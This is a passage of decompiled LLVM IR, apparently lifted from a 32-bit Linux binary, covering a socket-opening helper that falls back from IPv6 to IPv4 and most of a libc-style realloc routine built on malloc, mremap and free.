  uselistorder i32 -16, { 243, 73, 74, 75, 64, 66, 67, 63, 65, 62, 68, 61, 69, 70, 71, 72, 76, 59, 77, 41, 78, 259, 260, 80, 79, 81, 82, 60, 84, 85, 83, 42, 245, 86, 87, 246, 88, 89, 43, 261, 262, 90, 266, 267, 263, 244, 264, 48, 91, 92, 93, 94, 49, 247, 248, 46, 249, 47, 250, 251, 44, 252, 45, 253, 254, 95, 96, 50, 51, 255, 256, 52, 257, 258, 102, 103, 97, 98, 99, 100, 101, 104, 105, 53, 106, 107, 108, 265, 0, 122, 120, 119, 117, 118, 55, 111, 56, 112, 113, 114, 110, 115, 116, 109, 54, 121, 123, 128, 129, 127, 130, 131, 132, 133, 124, 125, 126, 134, 135, 139, 136, 137, 138, 140, 163, 164, 165, 162, 159, 158, 160, 161, 155, 156, 157, 152, 153, 154, 151, 150, 149, 148, 147, 142, 143, 144, 145, 146, 166, 141, 167, 16, 17, 173, 169, 168, 170, 171, 172, 174, 18, 19, 181, 176, 177, 175, 178, 179, 180, 182, 20, 21, 6, 183, 184, 22, 23, 188, 189, 190, 187, 185, 186, 1, 191, 24, 25, 192, 193, 194, 195, 196, 197, 198, 200, 3, 2, 199, 4, 201, 202, 57, 5, 203, 204, 205, 58, 206, 207, 208, 210, 211, 209, 8, 26, 212, 27, 28, 214, 215, 213, 9, 29, 216, 30, 31, 218, 219, 217, 10, 32, 221, 222, 220, 11, 33, 223, 34, 35, 225, 226, 224, 12, 36, 228, 229, 227, 13, 37, 231, 232, 230, 14, 38, 234, 7, 233, 235, 39, 40, 236, 237, 238, 239, 240, 241, 242, 15 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8065343, { 1, 0 }
  uselistorder label %dec_label_pc_8065309, { 1, 0 }
}

define i32 @__opensock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_8065355 = call i32 @socket(i32 10, i32 2, i32 0)
  %v2_806535d = icmp slt i32 %v3_8065355, 0
  %v1_806535f = icmp eq i1 %v2_806535d, false
  br i1 %v1_806535f, label %dec_label_pc_8065370, label %dec_label_pc_8065361

dec_label_pc_8065361:                             ; preds = %entry
  %v3_8065368 = call i32 @socket(i32 2, i32 2, i32 0)
  br label %dec_label_pc_8065370

dec_label_pc_8065370:                             ; preds = %entry, %dec_label_pc_8065361
  %v0_8065373 = phi i32 [ %v3_8065355, %entry ], [ %v3_8065368, %dec_label_pc_8065361 ]
  ret i32 %v0_8065373

; uselistorder directives
  uselistorder label %dec_label_pc_8065370, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8065374 = load i32, i32* @ebp, align 4
  %v0_8065375 = load i32, i32* @edi, align 4
  %v0_8065376 = load i32, i32* @esi, align 4
  %v0_8065377 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_806537f = icmp eq i32* %arg1, null
  %v1_8065384 = icmp eq i1 %v4_806537f, false
  br i1 %v1_8065384, label %dec_label_pc_8065396, label %dec_label_pc_8065386

dec_label_pc_8065386:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_806538a = call i32 @malloc(i32 %arg2)
  store i32 %v1_806538a, i32* %eax.global-to-local, align 4
  store i32 %v1_806538a, i32* @ebx, align 4
  br label %dec_label_pc_806568f

dec_label_pc_8065396:                             ; preds = %entry
  %v1_8065396 = icmp eq i32 %arg2, 0
  %v1_8065398 = icmp eq i1 %v1_8065396, false
  br i1 %v1_8065398, label %dec_label_pc_80653ab, label %dec_label_pc_806539a

dec_label_pc_806539a:                             ; preds = %dec_label_pc_8065396
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80653a1 = call i32 @free(i32 %tmp7)
  store i32 %v1_80653a1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806568f

dec_label_pc_80653ab:                             ; preds = %dec_label_pc_8065396
  %v2_80653b6 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80653b6, i32* %eax.global-to-local, align 4
  store i32 %v2_80653b6, i32* %stack_var_-60, align 4
  %v4_80653bb = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 ptrtoint (i32* @global_var_8074750.648 to i32))
  store i32 %v4_80653bb, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8074750.648 to i32), i32* %stack_var_-60, align 4
  %v1_80653c7 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074750.648 to i32))
  store i32 %v1_80653c7, i32* %eax.global-to-local, align 4
  %v0_80653cf = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_80653cf, -32
  br i1 %tmp, label %dec_label_pc_80653e6, label %dec_label_pc_80653d4

dec_label_pc_80653d4:                             ; preds = %dec_label_pc_80653ab
  %v0_80653d4 = load i32, i32* %stack_var_-60, align 4
  %v1_80653d4 = call i32 @__errno_location(i32 %v0_80653d4)
  store i32 %v1_80653d4, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_80653db = inttoptr i32 %v1_80653d4 to i32*
  store i32 12, i32* %v1_80653db, align 4
  br label %dec_label_pc_8065692

dec_label_pc_80653e6:                             ; preds = %dec_label_pc_80653ab
  %v1_80653e6 = add i32 %v0_80653cf, 11
  %tmp20 = icmp ult i32 %v1_80653e6, 16
  br i1 %tmp20, label %dec_label_pc_80653fd, label %dec_label_pc_80653f6

dec_label_pc_80653f6:                             ; preds = %dec_label_pc_80653e6
  %v1_80653f6 = and i32 %v1_80653e6, -8
  br label %dec_label_pc_80653fd

dec_label_pc_80653fd:                             ; preds = %dec_label_pc_80653e6, %dec_label_pc_80653f6
  %stack_var_-40.0 = phi i32 [ %v1_80653f6, %dec_label_pc_80653f6 ], [ 16, %dec_label_pc_80653e6 ]
  %storemerge24 = phi i32 [ %v1_80653f6, %dec_label_pc_80653f6 ], [ %v1_80653e6, %dec_label_pc_80653e6 ]
  store i32 %storemerge24, i32* %eax.global-to-local, align 4
  %v1_8065401 = add i32 %tmp7, -8
  store i32 %v1_8065401, i32* @edi, align 4
  %v1_8065404 = add i32 %tmp7, -4
  %v2_8065404 = inttoptr i32 %v1_8065404 to i32*
  %v3_8065404 = load i32, i32* %v2_8065404, align 4
  store i32 %v3_8065404, i32* %edx.global-to-local, align 4
  %v1_8065409 = and i32 %v3_8065404, -4
  store i32 %v1_8065409, i32* %eax.global-to-local, align 4
  %v2_8065410 = and i32 %v3_8065404, 2
  %v3_8065410 = icmp eq i32 %v2_8065410, 0
  %v1_8065413 = icmp eq i1 %v3_8065410, false
  br i1 %v1_8065413, label %dec_label_pc_80655ad, label %dec_label_pc_8065419

dec_label_pc_8065419:                             ; preds = %dec_label_pc_80653fd
  store i32 %stack_var_-40.0, i32* @ecx, align 4
  store i32 %v1_8065409, i32* @ebx, align 4
  %v7_806541f = icmp ult i32 %v1_8065409, %stack_var_-40.0
  %v1_8065421 = icmp eq i1 %v7_806541f, false
  br i1 %v1_8065421, label %dec_label_pc_8065558, label %dec_label_pc_8065427

dec_label_pc_8065427:                             ; preds = %dec_label_pc_8065419
  %v2_8065427 = add i32 %v1_8065409, %v1_8065401
  store i32 %v2_8065427, i32* @esi, align 4
  %v1_806542a = load i32, i32* @global_var_807e64c.733, align 4
  %v12_806542a = icmp eq i32 %v2_8065427, %v1_806542a
  %v1_8065430 = icmp eq i1 %v12_806542a, false
  %v1_806546a = add i32 %v2_8065427, 4
  %v2_806546a = inttoptr i32 %v1_806546a to i32*
  %v3_806546a = load i32, i32* %v2_806546a, align 4
  br i1 %v1_8065430, label %dec_label_pc_806546a, label %dec_label_pc_8065432

dec_label_pc_8065432:                             ; preds = %dec_label_pc_8065427
  %v1_8065437 = and i32 %v3_806546a, -4
  %v2_806543a = add i32 %v1_8065437, %v1_8065409
  store i32 %v2_806543a, i32* @ecx, align 4
  %v1_8065440 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8065440, i32* %eax.global-to-local, align 4
  %v7_8065443 = icmp ult i32 %v2_806543a, %v1_8065440
  br i1 %v7_8065443, label %dec_label_pc_80654a8, label %dec_label_pc_8065447

dec_label_pc_8065447:                             ; preds = %dec_label_pc_8065432
  %v1_8065447 = urem i32 %v3_8065404, 2
  %v5_806544a = or i32 %v1_8065447, %stack_var_-40.0
  store i32 %v5_806544a, i32* %edx.global-to-local, align 4
  store i32 %v5_806544a, i32* %v2_8065404, align 4
  %v0_8065455 = load i32, i32* @ecx, align 4
  %v2_8065455 = sub i32 %v0_8065455, %stack_var_-40.0
  %v0_8065457 = load i32, i32* @edi, align 4
  %v2_8065457 = add i32 %v0_8065457, %stack_var_-40.0
  store i32 %v2_8065457, i32* %eax.global-to-local, align 4
  %v1_806545a = or i32 %v2_8065455, 1
  store i32 %v1_806545a, i32* @ecx, align 4
  store i32 %v2_8065457, i32* @global_var_807e64c.733, align 4
  %v2_8065462 = add i32 %v2_8065457, 4
  %v3_8065462 = inttoptr i32 %v2_8065462 to i32*
  store i32 %v1_806545a, i32* %v3_8065462, align 4
  br label %dec_label_pc_806567d

dec_label_pc_806546a:                             ; preds = %dec_label_pc_8065427
  store i32 %v3_806546a, i32* %edx.global-to-local, align 4
  %v1_806546f = and i32 %v3_806546a, -2
  store i32 %v1_806546f, i32* %eax.global-to-local, align 4
  %v3_8065472 = add i32 %v1_806546a, %v1_806546f
  %v4_8065472 = inttoptr i32 %v3_8065472 to i8*
  %v5_8065472 = load i8, i8* %v4_8065472, align 1
  %v6_8065472 = urem i8 %v5_8065472, 2
  %v7_8065472 = icmp eq i8 %v6_8065472, 0
  %v1_8065477 = icmp eq i1 %v7_8065472, false
  br i1 %v1_8065477, label %dec_label_pc_80654a8, label %dec_label_pc_8065479

dec_label_pc_8065479:                             ; preds = %dec_label_pc_806546a
  %v1_8065479 = and i32 %v3_806546a, -4
  store i32 %v1_8065479, i32* %edx.global-to-local, align 4
  %v2_8065480 = add i32 %v1_8065479, %v1_8065409
  store i32 %v2_8065480, i32* @ebx, align 4
  %v10_8065482 = icmp ult i32 %v2_8065480, %stack_var_-40.0
  br i1 %v10_8065482, label %dec_label_pc_80654a8, label %dec_label_pc_8065488

dec_label_pc_8065488:                             ; preds = %dec_label_pc_8065479
  %v1_8065488 = add i32 %v1_8065409, %tmp7
  %v2_8065488 = inttoptr i32 %v1_8065488 to i32*
  %v3_8065488 = load i32, i32* %v2_8065488, align 4
  store i32 %v3_8065488, i32* @edx, align 4
  %v1_806548b = add i32 %v2_8065427, 12
  %v2_806548b = inttoptr i32 %v1_806548b to i32*
  %v3_806548b = load i32, i32* %v2_806548b, align 4
  store i32 %v3_806548b, i32* %eax.global-to-local, align 4
  %v1_806548e = add i32 %v3_8065488, 12
  %v2_806548e = inttoptr i32 %v1_806548e to i32*
  %v3_806548e = load i32, i32* %v2_806548e, align 4
  %v15_806548e = icmp eq i32 %v3_806548e, %v2_8065427
  %v1_8065491 = icmp eq i1 %v15_806548e, false
  br i1 %v1_8065491, label %dec_label_pc_8065498, label %dec_label_pc_8065493

dec_label_pc_8065493:                             ; preds = %dec_label_pc_8065488
  %v1_8065493 = add i32 %v3_806548b, 8
  %v2_8065493 = inttoptr i32 %v1_8065493 to i32*
  %v3_8065493 = load i32, i32* %v2_8065493, align 4
  %v15_8065493 = icmp eq i32 %v3_8065493, %v2_8065427
  br i1 %v15_8065493, label %dec_label_pc_806549d, label %dec_label_pc_8065498

dec_label_pc_8065498:                             ; preds = %dec_label_pc_8065493, %dec_label_pc_8065488
  %v0_8065498 = call i32 @abort()
  store i32 %v0_8065498, i32* %eax.global-to-local, align 4
  %v1_806549d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_806549d

dec_label_pc_806549d:                             ; preds = %dec_label_pc_8065493, %dec_label_pc_8065498
  %v1_806549d = phi i32 [ %v3_8065488, %dec_label_pc_8065493 ], [ %v1_806549d.pre, %dec_label_pc_8065498 ]
  %v0_806549d = phi i32 [ %v3_806548b, %dec_label_pc_8065493 ], [ %v0_8065498, %dec_label_pc_8065498 ]
  %v2_806549d = add i32 %v1_806549d, 12
  %v3_806549d = inttoptr i32 %v2_806549d to i32*
  store i32 %v0_806549d, i32* %v3_806549d, align 4
  %v0_80654a0 = load i32, i32* @edx, align 4
  %v1_80654a0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80654a0 = add i32 %v1_80654a0, 8
  %v3_80654a0 = inttoptr i32 %v2_80654a0 to i32*
  store i32 %v0_80654a0, i32* %v3_80654a0, align 4
  %v0_8065558.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8065558

dec_label_pc_80654a8:                             ; preds = %dec_label_pc_8065479, %dec_label_pc_806546a, %dec_label_pc_8065432
  %v1_80654af = add i32 %stack_var_-40.0, -7
  store i32 %v1_80654af, i32* %eax.global-to-local, align 4
  store i32 %v1_80654af, i32* %stack_var_-60, align 4
  %v1_80654b3 = call i32 @malloc(i32 %v1_80654af)
  store i32 %v1_80654b3, i32* %eax.global-to-local, align 4
  store i32 %v1_80654b3, i32* %edx.global-to-local, align 4
  %v1_80654bd = icmp eq i32 %v1_80654b3, 0
  br i1 %v1_80654bd, label %dec_label_pc_8065679, label %dec_label_pc_80654c5

dec_label_pc_80654c5:                             ; preds = %dec_label_pc_80654a8
  %v1_80654c5 = add i32 %v1_80654b3, -8
  store i32 %v1_80654c5, i32* %ebx.global-to-local, align 4
  %v1_80654c8 = load i32, i32* @esi, align 4
  %v12_80654c8 = icmp eq i32 %v1_80654c5, %v1_80654c8
  %v1_80654ca = add i32 %v1_80654b3, -4
  %v2_80654ca = inttoptr i32 %v1_80654ca to i32*
  %v3_80654ca = load i32, i32* %v2_80654ca, align 4
  store i32 %v3_80654ca, i32* %eax.global-to-local, align 4
  %v1_80654cd = icmp eq i1 %v12_80654c8, false
  br i1 %v1_80654cd, label %dec_label_pc_80654db, label %dec_label_pc_80654cf

dec_label_pc_80654cf:                             ; preds = %dec_label_pc_80654c5
  %v1_80654cf = and i32 %v3_80654ca, -4
  store i32 %v1_80654cf, i32* %eax.global-to-local, align 4
  store i32 %v1_8065409, i32* %edx.global-to-local, align 4
  %v2_80654d6 = add i32 %v1_80654cf, %v1_8065409
  store i32 %v2_80654d6, i32* @ebx, align 4
  br label %dec_label_pc_8065558

dec_label_pc_80654db:                             ; preds = %dec_label_pc_80654c5
  %v1_80654df = add i32 %v1_8065409, -4
  store i32 %v1_80654df, i32* %eax.global-to-local, align 4
  %v2_80654e4 = udiv i32 %v1_80654df, 4
  store i32 %v2_80654e4, i32* @ecx, align 4
  %tmp25 = icmp ult i32 %v1_80654df, 37
  br i1 %tmp25, label %dec_label_pc_80654fd, label %dec_label_pc_80654ec

dec_label_pc_80654ec:                             ; preds = %dec_label_pc_80654db
  store i32 %v1_80654b3, i32* %stack_var_-60, align 4
  %v3_80654f3 = inttoptr i32 %v1_80654b3 to i16*
  %v4_80654f3 = call i32 @memcpy(i16* %v3_80654f3, i32 %tmp7, i32 %v1_80654df)
  store i32 %v4_80654f3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065544

dec_label_pc_80654fd:                             ; preds = %dec_label_pc_80654db
  store i32 %tmp7, i32* @esi, align 4
  %v2_8065504 = load i32, i32* %arg1, align 4
  store i32 %v2_8065504, i32* %eax.global-to-local, align 4
  %v2_8065506 = inttoptr i32 %v1_80654b3 to i32*
  store i32 %v2_8065504, i32* %v2_8065506, align 4
  %v0_8065508 = load i32, i32* @esi, align 4
  %v1_8065508 = add i32 %v0_8065508, 4
  %v2_8065508 = inttoptr i32 %v1_8065508 to i32*
  %v3_8065508 = load i32, i32* %v2_8065508, align 4
  store i32 %v3_8065508, i32* %eax.global-to-local, align 4
  %v1_806550b = load i32, i32* %edx.global-to-local, align 4
  %v2_806550b = add i32 %v1_806550b, 4
  %v3_806550b = inttoptr i32 %v2_806550b to i32*
  store i32 %v3_8065508, i32* %v3_806550b, align 4
  %v0_806550e = load i32, i32* @esi, align 4
  %v1_806550e = add i32 %v0_806550e, 8
  %v2_806550e = inttoptr i32 %v1_806550e to i32*
  %v3_806550e = load i32, i32* %v2_806550e, align 4
  store i32 %v3_806550e, i32* %eax.global-to-local, align 4
  %v1_8065511 = load i32, i32* %edx.global-to-local, align 4
  %v2_8065511 = add i32 %v1_8065511, 8
  %v3_8065511 = inttoptr i32 %v2_8065511 to i32*
  store i32 %v3_806550e, i32* %v3_8065511, align 4
  %tmp26 = icmp ult i32 %v1_80654df, 17
  br i1 %tmp26, label %dec_label_pc_8065544, label %dec_label_pc_8065516

dec_label_pc_8065516:                             ; preds = %dec_label_pc_80654fd
  %v0_8065516 = load i32, i32* @esi, align 4
  %v1_8065516 = add i32 %v0_8065516, 12
  %v2_8065516 = inttoptr i32 %v1_8065516 to i32*
  %v3_8065516 = load i32, i32* %v2_8065516, align 4
  store i32 %v3_8065516, i32* %eax.global-to-local, align 4
  %v0_8065519 = load i32, i32* @ecx, align 4
  %v1_806551c = load i32, i32* %edx.global-to-local, align 4
  %v2_806551c = add i32 %v1_806551c, 12
  %v3_806551c = inttoptr i32 %v2_806551c to i32*
  store i32 %v3_8065516, i32* %v3_806551c, align 4
  %v0_806551f = load i32, i32* @esi, align 4
  %v1_806551f = add i32 %v0_806551f, 16
  %v2_806551f = inttoptr i32 %v1_806551f to i32*
  %v3_806551f = load i32, i32* %v2_806551f, align 4
  store i32 %v3_806551f, i32* %eax.global-to-local, align 4
  %v1_8065522 = load i32, i32* %edx.global-to-local, align 4
  %v2_8065522 = add i32 %v1_8065522, 16
  %v3_8065522 = inttoptr i32 %v2_8065522 to i32*
  store i32 %v3_806551f, i32* %v3_8065522, align 4
  %tmp21 = icmp ult i32 %v0_8065519, 7
  br i1 %tmp21, label %dec_label_pc_8065544, label %dec_label_pc_8065527

dec_label_pc_8065527:                             ; preds = %dec_label_pc_8065516
  %v0_8065527 = load i32, i32* @esi, align 4
  %v1_8065527 = add i32 %v0_8065527, 20
  %v2_8065527 = inttoptr i32 %v1_8065527 to i32*
  %v3_8065527 = load i32, i32* %v2_8065527, align 4
  store i32 %v3_8065527, i32* %eax.global-to-local, align 4
  %v0_806552a = load i32, i32* @ecx, align 4
  %v1_806552d = load i32, i32* %edx.global-to-local, align 4
  %v2_806552d = add i32 %v1_806552d, 20
  %v3_806552d = inttoptr i32 %v2_806552d to i32*
  store i32 %v3_8065527, i32* %v3_806552d, align 4
  %v0_8065530 = load i32, i32* @esi, align 4
  %v1_8065530 = add i32 %v0_8065530, 24
  %v2_8065530 = inttoptr i32 %v1_8065530 to i32*
  %v3_8065530 = load i32, i32* %v2_8065530, align 4
  store i32 %v3_8065530, i32* %eax.global-to-local, align 4
  %v1_8065533 = load i32, i32* %edx.global-to-local, align 4
  %v2_8065533 = add i32 %v1_8065533, 24
  %v3_8065533 = inttoptr i32 %v2_8065533 to i32*
  store i32 %v3_8065530, i32* %v3_8065533, align 4
  %tmp22 = icmp ult i32 %v0_806552a, 9
  br i1 %tmp22, label %dec_label_pc_8065544, label %dec_label_pc_8065538

dec_label_pc_8065538:                             ; preds = %dec_label_pc_8065527
  %v0_8065538 = load i32, i32* @esi, align 4
  %v1_8065538 = add i32 %v0_8065538, 28
  %v2_8065538 = inttoptr i32 %v1_8065538 to i32*
  %v3_8065538 = load i32, i32* %v2_8065538, align 4
  store i32 %v3_8065538, i32* %eax.global-to-local, align 4
  %v1_806553b = load i32, i32* %edx.global-to-local, align 4
  %v2_806553b = add i32 %v1_806553b, 28
  %v3_806553b = inttoptr i32 %v2_806553b to i32*
  store i32 %v3_8065538, i32* %v3_806553b, align 4
  %v0_806553e = load i32, i32* @esi, align 4
  %v1_806553e = add i32 %v0_806553e, 32
  %v2_806553e = inttoptr i32 %v1_806553e to i32*
  %v3_806553e = load i32, i32* %v2_806553e, align 4
  store i32 %v3_806553e, i32* %eax.global-to-local, align 4
  %v1_8065541 = load i32, i32* %edx.global-to-local, align 4
  %v2_8065541 = add i32 %v1_8065541, 32
  %v3_8065541 = inttoptr i32 %v2_8065541 to i32*
  store i32 %v3_806553e, i32* %v3_8065541, align 4
  br label %dec_label_pc_8065544

dec_label_pc_8065544:                             ; preds = %dec_label_pc_8065527, %dec_label_pc_8065516, %dec_label_pc_80654fd, %dec_label_pc_80654ec, %dec_label_pc_8065538
  %v0_8065547 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8065547 = add i32 %v0_8065547, 8
  store i32 %v1_8065547, i32* @ebx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_806554e = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_8065674

dec_label_pc_8065558:                             ; preds = %dec_label_pc_8065419, %dec_label_pc_80654cf, %dec_label_pc_806549d
  %v1_8065569 = phi i32 [ %v1_8065409, %dec_label_pc_8065419 ], [ %v2_80654d6, %dec_label_pc_80654cf ], [ %v0_8065558.pre, %dec_label_pc_806549d ]
  %v5_806555a = sub i32 %v1_8065569, %stack_var_-40.0
  store i32 %v5_806555a, i32* @ecx, align 4
  %tmp23 = icmp ult i32 %v5_806555a, 16
  br i1 %tmp23, label %dec_label_pc_8065563, label %dec_label_pc_8065575

dec_label_pc_8065563:                             ; preds = %dec_label_pc_8065558
  %v0_8065563 = load i32, i32* @edi, align 4
  %v1_8065563 = add i32 %v0_8065563, 4
  %v2_8065563 = inttoptr i32 %v1_8065563 to i32*
  %v3_8065563 = load i32, i32* %v2_8065563, align 4
  %v1_8065566 = urem i32 %v3_8065563, 2
  %v2_8065569 = or i32 %v1_8065566, %v1_8065569
  store i32 %v2_8065569, i32* %eax.global-to-local, align 4
  store i32 %v2_8065569, i32* %v2_8065563, align 4
  %v0_806556e = load i32, i32* @edi, align 4
  %v1_806556e = load i32, i32* @ebx, align 4
  %v2_806556e = add i32 %v0_806556e, 4
  %v3_806556e = add i32 %v2_806556e, %v1_806556e
  %v4_806556e = inttoptr i32 %v3_806556e to i32*
  %v5_806556e = load i32, i32* %v4_806556e, align 4
  %v6_806556e = or i32 %v5_806556e, 1
  store i32 %v6_806556e, i32* %v4_806556e, align 4
  br label %dec_label_pc_80655a5

dec_label_pc_8065575:                             ; preds = %dec_label_pc_8065558
  store i32 %stack_var_-40.0, i32* %edx.global-to-local, align 4
  %v0_8065579 = load i32, i32* @edi, align 4
  %v2_8065579 = add i32 %v0_8065579, %stack_var_-40.0
  store i32 %v2_8065579, i32* %eax.global-to-local, align 4
  %v1_806557c = add i32 %v0_8065579, 4
  %v2_806557c = inttoptr i32 %v1_806557c to i32*
  %v3_806557c = load i32, i32* %v2_806557c, align 4
  %v1_806557f = urem i32 %v3_806557c, 2
  %v5_8065582 = or i32 %v1_806557f, %stack_var_-40.0
  store i32 %v5_8065582, i32* %v2_806557c, align 4
  %v0_806558c = load i32, i32* @ecx, align 4
  %v1_806558e = or i32 %v0_806558c, 1
  store i32 %v1_806558e, i32* %edx.global-to-local, align 4
  %v1_8065591 = load i32, i32* %eax.global-to-local, align 4
  %v2_8065591 = add i32 %v1_8065591, 4
  %v3_8065591 = inttoptr i32 %v2_8065591 to i32*
  store i32 %v1_806558e, i32* %v3_8065591, align 4
  %v0_8065594 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065594 = load i32, i32* @ecx, align 4
  %v2_8065594 = add i32 %v0_8065594, 4
  %v3_8065594 = add i32 %v2_8065594, %v1_8065594
  %v4_8065594 = inttoptr i32 %v3_8065594 to i32*
  %v5_8065594 = load i32, i32* %v4_8065594, align 4
  %v6_8065594 = or i32 %v5_8065594, 1
  store i32 %v6_8065594, i32* %v4_8065594, align 4
  %v0_8065599 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065599 = add i32 %v0_8065599, 8
  store i32 %v1_8065599, i32* %eax.global-to-local, align 4
  store i32 %v1_8065599, i32* %stack_var_-60, align 4
  %v1_806559d = call i32 @free(i32 %v1_8065599)
  store i32 %v1_806559d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80655a5

dec_label_pc_80655a5:                             ; preds = %dec_label_pc_8065563, %dec_label_pc_8065575
  %v0_80655a5 = load i32, i32* @edi, align 4
  %v1_80655a5 = add i32 %v0_80655a5, 8
  store i32 %v1_80655a5, i32* @ebx, align 4
  br label %dec_label_pc_8065681

dec_label_pc_80655ad:                             ; preds = %dec_label_pc_80653fd
  store i32 %tmp7, i32* @ecx, align 4
  %v0_80655b1 = load i32, i32* @global_var_807e97c.738, align 4
  %v1_80655b6 = add i32 %v0_80655b1, -1
  store i32 %v1_80655b6, i32* %eax.global-to-local, align 4
  %v2_80655bb = inttoptr i32 %v1_8065401 to i32*
  %v3_80655bb = load i32, i32* %v2_80655bb, align 4
  store i32 %v3_80655bb, i32* @ebp, align 4
  %v1_80655be = or i32 %stack_var_-40.0, 4
  store i32 %v1_80655be, i32* %stack_var_-44, align 4
  %v2_80655c4 = add i32 %v3_80655bb, %v1_80655b6
  store i32 %v2_80655c4, i32* %edx.global-to-local, align 4
  %v1_80655c7 = sub i32 0, %v0_80655b1
  store i32 %v1_80655c7, i32* %eax.global-to-local, align 4
  %v2_80655c9 = add i32 %v2_80655c4, %v1_80655be
  %v2_80655cc = and i32 %v2_80655c9, %v1_80655c7
  store i32 %v2_80655cc, i32* @esi, align 4
  %v2_80655d0 = sub i32 %v2_80655cc, %v3_80655bb
  store i32 %v2_80655d0, i32* @ebx, align 4
  %v15_80655d2 = icmp eq i32 %v1_8065409, %v2_80655d0
  br i1 %v15_80655d2, label %dec_label_pc_806567d, label %dec_label_pc_80655dc

dec_label_pc_80655dc:                             ; preds = %dec_label_pc_80655ad
  %v2_80655e3 = sub i32 %v1_8065401, %v3_80655bb
  store i32 %v2_80655e3, i32* @edi, align 4
  %v2_80655e5 = add i32 %v3_80655bb, %v1_8065409
  store i32 %v2_80655e5, i32* %eax.global-to-local, align 4
  store i32 %v2_80655e3, i32* %stack_var_-60, align 4
  %v6_80655e9 = call i32 @mremap(i32 %v2_80655e3, i32 %v2_80655e5, i32 %v2_80655cc, i32 1, i32 %v1_80655be, i32 %v1_8065409)
  store i32 %v6_80655e9, i32* %eax.global-to-local, align 4
  %v10_80655f1 = icmp eq i32 %v6_80655e9, -1
  br i1 %v10_80655f1, label %dec_label_pc_8065635, label %dec_label_pc_80655f6

dec_label_pc_80655f6:                             ; preds = %dec_label_pc_80655dc
  %v1_80655f6 = load i32, i32* @ebp, align 4
  %v2_80655f6 = add i32 %v1_80655f6, %v6_80655e9
  store i32 %v2_80655f6, i32* %edx.global-to-local, align 4
  %v0_80655f9 = load i32, i32* @ebx, align 4
  %v1_80655f9 = or i32 %v0_80655f9, 2
  store i32 %v1_80655f9, i32* %ebx.global-to-local, align 4
  %v0_80655fc = load i32, i32* @esi, align 4
  store i32 %v0_80655fc, i32* %eax.global-to-local, align 4
  %v2_80655fe = add i32 %v2_80655f6, 4
  %v3_80655fe = inttoptr i32 %v2_80655fe to i32*
  store i32 %v1_80655f9, i32* %v3_80655fe, align 4
  %v0_8065601 = load i32, i32* %eax.global-to-local, align 4
  %v5_8065601 = sub i32 %v0_8065601, %v1_8065409
  %v1_8065605 = load i32, i32* @global_var_807e984.743, align 4
  %v2_8065605 = add i32 %v1_8065605, %v5_8065601
  store i32 %v2_8065605, i32* %eax.global-to-local, align 4
  store i32 %v2_8065605, i32* @global_var_807e984.743, align 4
  %v1_8065610 = load i32, i32* @global_var_807e990.744, align 16
  %tmp27 = icmp ugt i32 %v2_8065605, %v1_8065610
  br i1 %tmp27, label %dec_label_pc_8065618, label %dec_label_pc_806561d

dec_label_pc_8065618:                             ; preds = %dec_label_pc_80655f6
  store i32 %v2_8065605, i32* @global_var_807e990.744, align 16
  br label %dec_label_pc_806561d

dec_label_pc_806561d:                             ; preds = %dec_label_pc_80655f6, %dec_label_pc_8065618
  %v1_806561d = load i32, i32* @global_var_807e988.745, align 8
  %v2_806561d = add i32 %v1_806561d, %v2_8065605
  store i32 %v2_806561d, i32* %eax.global-to-local, align 4
  %v1_8065623 = load i32, i32* @global_var_807e994.746, align 4
  %tmp28 = icmp ugt i32 %v2_806561d, %v1_8065623
  br i1 %tmp28, label %dec_label_pc_806562b, label %dec_label_pc_8065630

dec_label_pc_806562b:                             ; preds = %dec_label_pc_806561d
  store i32 %v2_806561d, i32* @global_var_807e994.746, align 4
  br label %dec_label_pc_8065630

dec_label_pc_8065630:                             ; preds = %dec_label_pc_806561d, %dec_label_pc_806562b
  %v0_8065630 = load i32, i32* %edx.global-to-local, align 4
  %v1_8065630 = add i32 %v0_8065630, 8
  store i32 %v1_8065630, i32* @ebx, align 4
  br label %dec_label_pc_8065681

dec_label_pc_8065635:                             ; preds = %dec_label_pc_80655dc
  %v2_8065635 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8065635, i32* %eax.global-to-local, align 4
  %v10_8065638 = icmp ult i32 %v1_8065409, %v2_8065635
  %v1_806563c = icmp eq i1 %v10_8065638, false
  br i1 %v1_806563c, label %dec_label_pc_806567d, label %dec_label_pc_806563e

dec_label_pc_806563e:                             ; preds = %dec_label_pc_8065635
  %v1_8065645 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8065645, i32* %eax.global-to-local, align 4
  store i32 %v1_8065645, i32* %stack_var_-60, align 4
  %v1_8065649 = call i32 @malloc(i32 %v1_8065645)
